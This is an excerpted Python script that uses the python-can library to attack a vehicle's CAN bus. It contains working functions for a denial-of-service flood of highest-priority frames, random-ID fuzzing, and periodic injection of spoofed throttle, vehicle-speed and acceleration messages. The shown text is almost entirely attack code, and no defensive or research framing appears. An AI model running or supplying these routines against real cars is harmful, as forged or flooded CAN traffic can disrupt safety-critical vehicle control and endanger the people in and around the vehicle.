...
def dos_attack(interval=0.003, duration=20):
    """Sends a strem of high-priority message."""
    print("Starting DoS Attack")
    for i in range(int(duration / interval)):
        msg = can.Message(arbitration_id=0x000, data=[0, 0, 0, 0, 0, 0, 0, 0])
...
def fuzzy_attack(interval=0.003, duration=20):
    ...
    for i in range(int(duration / interval)):
        msg = can.Message(arbitration_id=random.randrange(0, 4095), data=generate_random_bytes())
        task = bus.send_periodic(msg, interval)
        assert isinstance(task, can.CyclicSendTaskABC)
        time.sleep(interval)
        task.stop()
...
def throt_vehicspeed_spoofing(interval=0.1, duration=20):
    """Sends falsified throttle and vehicle speed message."""
    print("Starting Throttle and Vehicle Speed Spoofing")
    for i in range(int(duration / interval)):
        msg = can.Message(arbitration_id=0x7E2, data=[00, 65, 00, 00, 00, 00, 00, 00])
        task = bus.send_periodic(msg, interval)
        assert isinstance(task, can.CyclicSendTaskABC)
        time.sleep(interval)
        task.stop()
...
def acelleration_spoofing(interval=0.05, duration=20):
    ...
    for i in range(int(duration / interval)):
        msg = can.Message(arbitration_id=0x7E0, data=[00, 65, 00, 00, 00, 00, 00, 00])
        task = bus.send_periodic(msg, interval)
        assert isinstance(task, can.CyclicSendTaskABC)
        time.sleep(interval)
        task.stop()
